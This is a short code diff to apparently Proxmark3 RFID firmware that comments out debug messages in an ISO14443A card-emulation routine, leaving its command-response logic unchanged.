@@ -386,28 +386,28 @@ void RunMod(void) {
 
                     // received a HALT
                 } else if (receivedCmd[0] == ISO14443A_CMD_HALT && len == 4) {
-                    DbpString(_YELLOW_("+") "Received a HALT");
+//                    DbpString(_YELLOW_("+") "Received a HALT");
                     p_response = NULL;
 
                     // received a WAKEUP
                 } else if (receivedCmd[0] == ISO14443A_CMD_WUPA && len == 1) {
-                    DbpString(_YELLOW_("+") "WAKEUP Received");
+//                    DbpString(_YELLOW_("+") "WAKEUP Received");
                     prevCmd = 0;
                     p_response = &responses[RESP_INDEX_ATQA];
 
                     // received request for UID (cascade 1)
                 } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 2) {
-                    DbpString(_YELLOW_("+") "Request for UID C1");
+//                    DbpString(_YELLOW_("+") "Request for UID C1");
                     p_response = &responses[RESP_INDEX_UIDC1];
 
                     // received a SELECT (cascade 1)
                 } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 9) {
-                    DbpString(_YELLOW_("+") "Request for SELECT S1");
+//                    DbpString(_YELLOW_("+") "Request for SELECT S1");
                     p_response = &responses[RESP_INDEX_SAKC1];
 
                     // received a RATS request
                 } else if (receivedCmd[0] == ISO14443A_CMD_RATS && len == 4) {
-                    DbpString(_YELLOW_("+") "Request for RATS");
+//                    DbpString(_YELLOW_("+") "Request for RATS");
                     prevCmd = 0;
                     p_response = &responses[RESP_INDEX_RATS];
 
